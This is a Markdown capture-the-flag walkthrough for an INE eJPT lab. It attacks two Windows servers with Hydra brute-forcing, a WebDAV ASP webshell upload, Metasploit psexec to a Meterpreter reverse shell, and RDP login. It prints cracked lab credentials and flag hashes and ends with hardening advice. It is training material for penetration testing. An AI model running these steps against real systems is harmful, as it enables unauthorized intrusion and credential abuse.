<div align="center">
  <a href="../../README.md">⬅️ <b>Back to eJPT Track Hub</b></a> | <a href="../../../README.md">🏠 <b>Portfolio Root</b></a>
</div>

<br>

<div align="center">
  <h1>🎯 Host & Network Penetration Testing — System-Host Based Attacks CTF 1 🎯</h1>
  <p><b>Platform:</b> INE Security | <b>Learning Path:</b> Penetration Testing Student (eJPT v2) | <b>Course:</b> Host & Network Penetration Testing: System/Host Based Attacks | <b>Difficulty:</b> Easy / Medium</p>
  <p><i>Date Completed: 18 October 2026</i></p>

[![Platform - INE](https://img.shields.io/badge/Platform-INE%20Security-0078D4?style=flat-square&logo=target)](https://ine.com/)
[![Track - eJPT](https://img.shields.io/badge/Track-eJPT%20v2-orange?style=flat-square&logo=hackthebox)](../../README.md)
[![Flags - 4/4](https://img.shields.io/badge/Flags%20Captured-4%20%2F%204-success?style=flat-square&logo=checkmarx)](./README.md)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-T1110%20%7C%20T1190%20%7C%20T1505-red?style=flat-square)](https://attack.mitre.org/)
</div>

---

## 📋 Objective & Scope
> **Perform host and system-based penetration testing against two Windows Server targets (`target1.ine.local` and `target2.ine.local`). The objective is to identify vulnerable web applications and services, conduct dictionary-based credential attacks, exploit insecure WebDAV configurations for remote code execution, pivot across SMB services using PsExec, and leverage graphical remote administration (RDP) to capture all 4 challenge flags.**

- **Target 1 (`target1.ine.local` / `10.5.17.248`):** Windows Server 2016 Datacenter running Microsoft IIS 10.0 with HTTP Basic Authentication and WebDAV extensions enabled.
- **Target 2 (`target2.ine.local` / `10.5.16.171`):** Windows Server Datacenter hosting SMB (139/445), WinRM (5985), and Remote Desktop Protocol (3389).
- **Provided Assessment Artifacts:**
  - `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
  - `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
  - `/usr/share/webshells/asp/webshell.asp`

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20132910.png" alt="INE System-Host Based Attacks CTF 1 challenge dashboard showing target details and task prompts" width="850px">
  <br><i>Figure 1: INE Lab Dashboard — Challenge overview, target hostnames, wordlists, and objective tasks.</i>
</div>

<br>

---

## 🛠️ Tools Used
| Tool | Purpose in Assessment |
| :--- | :--- |
| **Nmap** | Comprehensive TCP network reconnaissance, service version detection, and default script auditing. |
| **THC-Hydra** | High-performance dictionary attacks against HTTP Basic Authentication and SMB shares. |
| **DIRB** | Web path brute-forcing to discover the hidden `/webdav/` directory. |
| **DAVTest** | Automated WebDAV vulnerability scanner testing HTTP PUT permissions and file execution capabilities. |
| **Cadaver** | Command-line WebDAV client utilized for interactive authentication, flag retrieval, and ASP webshell deployment. |
| **Metasploit Framework (`msfconsole`)** | Lateral execution via `exploit/windows/smb/psexec` to obtain an administrative Meterpreter reverse shell. |
| **FreeRDP (`xfreerdp`)** | Authenticated graphical remote desktop client connecting to the target Windows desktop. |
| **Firefox Browser** | Web interface interaction, WebDAV index verification, and webshell command execution. |

<br>

---

## 🗺️ MITRE ATT&CK® Enterprise Mapping
| Tactic | Technique ID | Technique Name | Description in Lab |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Conducting comprehensive Nmap service sweeps and WebDAV capability testing. |
| **Credential Access** | `T1110.001` | Brute Force: Password Guessing | Cracking HTTP Basic Auth credentials (`bob`) and SMB accounts (`administrator`). |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Uploading active server pages via unrestricted WebDAV PUT methods. |
| **Persistence / Execution** | `T1505.003` | Server Software Component: Web Shell | Deploying `webshell.asp` to run arbitrary Windows shell commands as `bob`. |
| **Lateral Movement** | `T1021.002` | Remote Services: SMB/Windows Admin Shares | Executing Meterpreter payload via PsExec service injection on port 445. |
| **Lateral Movement** | `T1021.001` | Remote Services: Remote Desktop Protocol | Logging into the interactive GUI desktop via `xfreerdp` with cracked credentials. |
| **Discovery** | `T1083` | File and Directory Discovery | Enumerating root `C:\` and user Desktop files to extract challenge flags. |

<br>

---

## 🔍 1. Reconnaissance & Service Fingerprinting

### 🌐 Target 1 Network Scanning (`target1.ine.local`)
We initiate active reconnaissance against `target1.ine.local` using Nmap service version detection (`-sV`) and default NSE scripts (`-sC`):

```bash
nmap -sV -sC target1.ine.local
```

**Key Findings:**
- **Port 80/tcp (HTTP):** Microsoft IIS httpd 10.0 enforcing HTTP Basic Authentication (`Basic realm="..."`).
- **Port 135/tcp (MSRPC):** Microsoft Windows RPC endpoint mapper.
- **Port 139/445/tcp (NetBIOS/SMB):** Windows Server 2016 Datacenter 14393; SMB message signing enabled but not required.
- **Port 3389/tcp (RDP):** Microsoft Terminal Services / Remote Desktop.
- **Port 5985/tcp (WinRM):** Microsoft HTTPAPI httpd 2.0 (Windows Remote Management).

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20133803.png" alt="Nmap scan output against target1 showing IIS 10.0, RPC, and SMB services" width="850px">
  <br><i>Figure 2: Nmap service scan results for target1.ine.local (Part 1 — Ports 80, 135, 139, 445).</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20133853.png" alt="Nmap scan output against target1 showing RDP and WinRM services" width="850px">
  <br><i>Figure 3: Nmap service scan results for target1.ine.local (Part 2 — Ports 3389, 5985, and SMB security modes).</i>
</div>

<br>

---

### 🌐 Target 2 Network Scanning (`target2.ine.local`)
Next, we scan the second target host (`target2.ine.local` / `10.5.16.171`):

```bash
nmap -sV -sC target2.ine.local
```

**Key Findings:**
- **Port 135/tcp (MSRPC):** Windows RPC endpoint.
- **Port 139/445/tcp (NetBIOS/SMB):** Active SMB file sharing service on Windows Server 2016/2019 Datacenter.
- **Port 3389/tcp (RDP):** Microsoft Terminal Services running with SSL/TLS encryption.
- **Port 5985/tcp (WinRM):** Windows Remote Management HTTP service.

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20134352.png" alt="Nmap scan output against target2 showing RPC, NetBIOS, and SMB" width="850px">
  <br><i>Figure 4: Nmap service scan results for target2.ine.local (Part 1 — Ports 135, 139, 445).</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20134641.png" alt="Nmap scan output against target2 showing RDP, WinRM, and OS fingerprint" width="850px">
  <br><i>Figure 5: Nmap service scan results for target2.ine.local (Part 2 — Ports 3389, 5985, and Host scripts).</i>
</div>

<br>

---

## ⚡ 2. Flag Acquisition & Technical Methodology

### 🚩 Flag 1: HTTP Basic Auth Cracking & WebDAV Enumeration
**Prompt:** *"User 'bob' might not have chosen a strong password. Try common passwords. (target1.ine.local)"*

#### Step 1: Hydra Password Attack
The lab hint specifies targeting user account `bob` with common passwords. We leverage THC-Hydra against HTTP Basic Authentication on `target1.ine.local`:

```bash
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get /
```

**Cracking Result:**
```text
[80][http-get] host: target1.ine.local   login: bob   password: password_123321
1 of 1 target successfully completed, 1 valid password found
```

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20134850.png" alt="THC-Hydra successfully cracking HTTP basic auth for user bob" width="850px">
  <br><i>Figure 6: Hydra brute-force cracking HTTP Basic Auth credentials for user bob (`bob:password_123321`).</i>
</div>

<br>

#### Step 2: Web Directory Discovery
We execute `dirb` against `http://target1.ine.local/` to enumerate accessible application endpoints:

```bash
dirb http://target1.ine.local/
```

**DIRB Output:**
```text
==> DIRECTORY: http://target1.ine.local/webdav/
```

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20135109.png" alt="DIRB brute-forcing discovering webdav directory" width="850px">
  <br><i>Figure 7: DIRB identifying the WebDAV virtual directory endpoint.</i>
</div>

<br>

#### Step 3: WebDAV Capability Testing with `davtest`
To evaluate whether the discovered WebDAV instance allows file uploads and remote script execution under bob's credentials, we run `davtest`:

```bash
davtest -url http://target1.ine.local/webdav -auth bob:password_123321
```

`davtest` systematically uploads test files across multiple extensions and attempts HTTP GET requests to verify execution:
- `PUT` succeeded for `.txt`, `.html`, `.asp`, `.aspx`, etc.
- `EXEC` succeeded for **`.asp`** and **`.aspx`**!

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20135422.png" alt="davtest testing WebDAV upload capabilities" width="850px">
  <br><i>Figure 8: DAVTest checking directory creation and file upload permissions on /webdav/.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20135540.png" alt="davtest confirming ASP and ASPX execution permissions" width="850px">
  <br><i>Figure 9: DAVTest confirming that ASP and ASPX files can be both uploaded and executed.</i>
</div>

<br>

#### Step 4: Connecting via `cadaver` and Reading Flag 1
We launch `cadaver` to establish an interactive WebDAV session using `bob:password_123321`:

```bash
cadaver http://target1.ine.local/webdav
```
```text
dav:/webdav/> ls
dav:/webdav/> cat flag1.txt
```

**Flag 1 Hash:** `9ff97f766b3740a6a73b47a5b2a0ea33`

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20140448.png" alt="Cadaver interactive WebDAV session displaying flag1.txt contents" width="850px">
  <br><i>Figure 10: Using cadaver to inspect directory contents and read flag1.txt.</i>
</div>

<br>

We also confirm the findings directly via Firefox by authenticating as `bob:password_123321` and browsing to `http://target1.ine.local/webdav/flag1.txt`:

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20140834.png" alt="Firefox web browser viewing directory listing of /webdav/" width="850px">
  <br><i>Figure 11: Firefox web view of the /webdav/ directory showing flag1.txt and existing files.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20140904.png" alt="Firefox web browser viewing flag1.txt containing MD5 hash" width="850px">
  <br><i>Figure 12: Browsing directly to flag1.txt in Firefox, confirming the MD5 flag value.</i>
</div>

---

### 🚩 Flag 2: WebDAV ASP Shell Upload & C: Drive Exploration
**Prompt:** *"Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)"*

#### Step 1: Uploading the ASP Webshell
With write and execution permissions validated for `.asp` files, we upload the standard Kali Linux ASP webshell (`/usr/share/webshells/asp/webshell.asp`) into the WebDAV root:

```text
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress [================================>] 100% of 1362 bytes succeeded.
```

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20141425.png" alt="Cadaver uploading webshell.asp to WebDAV directory" width="850px">
  <br><i>Figure 13: Uploading webshell.asp via cadaver into the WebDAV collection.</i>
</div>

<br>

#### Step 2: Testing Remote Command Execution
We navigate to `http://target1.ine.local/webdav/webshell.asp` in Firefox and execute test command `dir`:

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20141603.png" alt="Firefox executing dir command via webshell.asp" width="850px">
  <br><i>Figure 14: Executing dir through webshell.asp, confirming command execution under the bob user context.</i>
</div>

<br>

#### Step 3: Reading Flag 2 from the C: Drive
Following the prompt instructions to inspect the root `C:\` drive, we execute:

```text
type C:\flag2.txt
```

**Webshell Output:**
```text
\\EC2AMAZ-JVD17HK\bobtarget1.ine.local
The server's local address: 10.5.17.248e83fffa710e84df4a246ff4bc1f6c5b0
```

The server appends the file content immediately after the local IP:  
**Flag 2 Hash:** `e83fffa710e84df4a246ff4bc1f6c5b0`

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20141725.png" alt="Firefox executing type C:\flag2.txt via webshell to reveal Flag 2" width="850px">
  <br><i>Figure 15: Executing type C:\flag2.txt in the webshell to retrieve Flag 2.</i>
</div>

---

### 🚩 Flag 3: SMB Credential Brute-Force & Metasploit PsExec
**Prompt:** *"SMB shares might contain hidden files. Check the available shares. (target2.ine.local)"*

#### Step 1: Hydra SMB Credential Attack
We target the SMB service on `target2.ine.local` (port 445) using the provided user and password lists:

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
      smb://target2.ine.local -s 445
```

**Discovered Credentials:**
- `rooty` : `spongebob`
- `demo` : `password1`
- `auditor` : `hellokitty`
- `administrator` : `pineapple`

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20141925.png" alt="Hydra SMB brute-force results showing valid accounts including administrator:pineapple" width="850px">
  <br><i>Figure 16: THC-Hydra SMB attack identifying four valid accounts, including administrator:pineapple.</i>
</div>

<br>

#### Step 2: Configuring PsExec in Metasploit
With full local `administrator` credentials, we launch `msfconsole` and configure `exploit/windows/smb/psexec` to obtain an interactive system shell:

```bash
msf6 > search psexec
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS target2.ine.local
msf6 exploit(windows/smb/psexec) > set SMBUser administrator
msf6 exploit(windows/smb/psexec) > set SMBPass pineapple
```

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20142245.png" alt="Metasploit console searching for psexec modules" width="850px">
  <br><i>Figure 17: Searching for PsExec exploit modules in Metasploit.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20142317.png" alt="Metasploit setting RHOSTS, SMBUser, and SMBPass for psexec" width="850px">
  <br><i>Figure 18: Configuring target host and administrative credentials in psexec.</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20142430.png" alt="Metasploit psexec options table part 1" width="850px">
  <br><i>Figure 19: Reviewing Metasploit psexec module options (Part 1).</i>
</div>

<br>

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20142522.png" alt="Metasploit psexec options table part 2 showing payload configuration" width="850px">
  <br><i>Figure 20: Reviewing Metasploit psexec options (Part 2 — reverse TCP handler and payload).</i>
</div>

<br>

#### Step 3: Exploitation and Flag 3 Extraction
We trigger the exploit:

```bash
msf6 exploit(windows/smb/psexec) > exploit
```

Metasploit authenticates over SMB, deploys the payload as a Windows service via PowerShell, and delivers an active Meterpreter session:

```text
[*] Started reverse TCP handler on 10.10.47.2:4444 
[*] Connecting to the server...
[*] Authenticating to target as user 'administrator'...
[*] Selecting PowerShell target
[*] Executing the payload...
[+] Service start timed out, OK if running a command or non-service executable...
[*] Meterpreter session 1 opened
```

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20143237.png" alt="Metasploit psexec successfully opening Meterpreter session 1" width="850px">
  <br><i>Figure 21: PsExec execution opening Meterpreter Session 1 on target2.ine.local.</i>
</div>

<br>

From the Meterpreter session, we drop into a native Windows command prompt (`shell`), navigate to `C:\`, and display `flag3.txt`:

```cmd
meterpreter > shell
C:\Windows\system32>cd \
C:\>type flag3.txt
4559e93ecaf94f1e9b486ee4dcc9246a
```

**Flag 3 Hash:** `4559e93ecaf94f1e9b486ee4dcc9246a`

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20145256.png" alt="Windows command shell executing type flag3.txt to display Flag 3 hash" width="850px">
  <br><i>Figure 22: Accessing C:\flag3.txt in the interactive Windows shell to reveal Flag 3.</i>
</div>

---

### 🚩 Flag 4: RDP Graphical Administration & Desktop Enumeration
**Prompt:** *"The Desktop directory might have what you're looking for. Enumerate its contents. (target2.ine.local)"*

#### Step 1: Connecting via FreeRDP
With valid administrator credentials (`administrator:pineapple`) and port 3389 open, we establish a remote desktop graphical connection using `xfreerdp`:

```bash
xfreerdp /u:administrator /p:pineapple /v:target2.ine.local:3389
```

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20144620.png" alt="Terminal command launching xfreerdp against target2.ine.local" width="850px">
  <br><i>Figure 23: Executing xfreerdp to open an administrative remote desktop session on target2.</i>
</div>

<br>

#### Step 2: Locating and Reading Flag 4
Upon authenticating into the Windows Server desktop, we immediately see `flag4.txt` placed on the Desktop:

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20144702.png" alt="FreeRDP graphical desktop showing flag4.txt file icon" width="850px">
  <br><i>Figure 24: FreeRDP session displaying the administrative Desktop with flag4.txt.</i>
</div>

<br>

Opening `flag4.txt` with Notepad reveals the final challenge flag:

```text
f08dc9b20bf44e33af6c0bc9ba7e1e68
```

**Flag 4 Hash:** `f08dc9b20bf44e33af6c0bc9ba7e1e68`

<div align="center">
  <img src="./images/Screenshot%202026-10-18%20144728.png" alt="Notepad showing flag4.txt MD5 hash value" width="850px">
  <br><i>Figure 25: Reading flag4.txt in Notepad to capture Flag 4.</i>
</div>

<br>

---

## 🏁 3. Flags Summary

| Flag # | Challenge Prompt / Task | Flag Value | Source / Methodology |
| :---: | :--- | :--- | :--- |
| **Flag 1** | User 'bob' might not have chosen a strong password. Try common passwords. (target1.ine.local) | `9ff97f766b3740a6a73b47a5b2a0ea33` | HTTP Basic Auth brute-force (`bob:password_123321`) & Cadaver `/webdav/flag1.txt` |
| **Flag 2** | Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local) | `e83fffa710e84df4a246ff4bc1f6c5b0` | Uploaded `webshell.asp` via WebDAV -> Executed `type C:\flag2.txt` |
| **Flag 3** | SMB shares might contain hidden files. Check the available shares. (target2.ine.local) | `4559e93ecaf94f1e9b486ee4dcc9246a` | SMB brute-force (`administrator:pineapple`) -> Metasploit PsExec Meterpreter -> `type C:\flag3.txt` |
| **Flag 4** | The Desktop directory might have what you're looking for. Enumerate its contents. (target2.ine.local) | `f08dc9b20bf44e33af6c0bc9ba7e1e68` | FreeRDP GUI login (`administrator:pineapple`) -> Opened `Desktop\flag4.txt` in Notepad |

<br>

---

## 🛡️ 4. Vulnerability Risk Ratings & Defensive Hardening

### 📊 CVSS v3.1 Findings Matrix
| Finding | Severity | CVSS v3.1 Score | Vector String |
| :--- | :---: | :---: | :--- |
| **Unrestricted File Upload & Script Execution via WebDAV** | 🔴 **Critical** | **9.8** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Weak Administrative Credentials on SMB & RDP** | 🔴 **High** | **8.8** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Insecure HTTP Basic Authentication Over Cleartext** | 🟡 **Medium** | **5.3** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Sensitive Data Stored with Inadequate File Permissions** | 🟡 **Medium** | **5.5** | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |

<br>

<details>
<summary><b>Click to expand enterprise remediation strategies & hardening guidelines</b></summary>
<br>

### 1. Hardening IIS WebDAV & Request Filtering
- **Root Cause:** WebDAV authoring rules permitted writing executable file types (`.asp`, `.aspx`) into a directory where script execution was enabled in IIS handler mappings.
- **Remediation:** 
  1. If WebDAV is not strictly required for business operations, remove the **WebDAV Publishing** feature entirely from IIS.
  2. If WebDAV is required, disable execute permissions on the target virtual directory:
     ```powershell
     # Disable script execution on the WebDAV virtual directory
     Set-WebConfigurationProperty -Filter /system.webServer/handlers `
       -Name accessPolicy -Value "Read" -PSPath "IIS:\Sites\Default Web Site\webdav"
     ```
  3. Configure IIS Request Filtering to deny dangerous extensions:
     ```xml
     <configuration>
       <system.webServer>
         <security>
           <requestFiltering>
             <fileExtensions>
               <add fileExtension=".asp" allowed="false" />
               <add fileExtension=".aspx" allowed="false" />
               <add fileExtension=".cer" allowed="false" />
             </fileExtensions>
           </requestFiltering>
         </security>
       </system.webServer>
     </configuration>
     ```

### 2. Eliminating Weak Credentials & Enforcing Password Policies
- **Root Cause:** Both web authentication (`bob:password_123321`) and system administrative accounts (`administrator:pineapple`) used common dictionary words with zero complexity.
- **Remediation:**
  - Enforce Group Policy Objects (GPO) mandating a minimum of 15 characters, combination of character sets, and dynamic checking against known breach databases (e.g., Azure AD Password Protection).
  - Implement Account Lockout policies (e.g., lock after 5 failed attempts within a 15-minute window) to prevent automated dictionary attacks.

### 3. Restricting Remote Management & SMB Hardening
- **Root Cause:** Administrative SMB shares (`ADMIN$`, `C$`) and RDP endpoints were exposed directly to untrusted network segments without MFA or IP restriction.
- **Remediation:**
  - Enforce SMB Signing and SMB Encryption across all Windows endpoints (`RequireSecuritySignature = 1`).
  - Restrict RDP access using Windows Defender Firewall with Advanced Security to allow connections only from designated jump hosts or VPN tunnels.
  - Require Network Level Authentication (NLA) for RDP.

</details>

<br>

---

## 💡 5. Key Learnings & Takeaways
- **WebDAV is a Prime Remote Code Execution Vector:** When WebDAV is paired with script execution permissions on IIS, attackers can easily bypass perimeter controls by uploading simple ASP/ASPX webshells.
- **Password Spraying Unlocks Windows Environments:** The same compromised credential (`administrator:pineapple`) yielded both low-level command execution (PsExec) and complete GUI control (RDP).
- **Tool Chaining Maximizes Efficiency:** The seamless progression from `hydra` -> `davtest` -> `cadaver` -> `webshell` on Target 1, followed by `hydra` -> `metasploit (psexec)` -> `xfreerdp` on Target 2 demonstrates practical, real-world penetration testing methodology.

---
<div align="center">
  <i>Walkthrough documented on 18 October 2026. Part of the INE eJPT Certification Journey.</i>
</div>
